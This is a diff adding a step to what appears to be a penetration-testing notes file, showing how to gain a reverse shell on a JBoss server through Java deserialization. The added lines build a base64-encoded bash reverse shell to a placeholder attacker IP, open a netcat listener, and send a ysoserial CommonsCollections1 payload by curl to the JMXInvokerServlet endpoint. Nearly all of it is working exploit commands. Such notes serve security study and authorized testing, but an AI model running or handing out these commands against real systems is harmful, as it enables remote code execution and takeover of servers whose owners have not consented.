@@ -786,3 +786,12 @@ ls
 hsperfdata_root  ks-script-V_wEqJ  nirajkharel  yum.log
 ```
 
+- To get a reverse shell, we can craft the payload as below
+```bash
+export PAYLOAD=$(echo "bash -i >& /dev/tcp/YOUR-IP/1337 0>&1" | base64)
+echo $PAYLOAD
+# Listen to an attacker port
+nc -lvnp 1337
+java -jar ysoserial-all.jar CommonsCollections1 "/bin/bash -c {/bin/echo,$PAYLOAD}|{/usr/bin/base64,-d}|{/bin/bash,-i}" | curl -X POST --data-binary @- http://YOUR-IP:8080/invoker/JMXInvokerServlet
+```
+- You will have a reverse shell gained in your netcat listener.
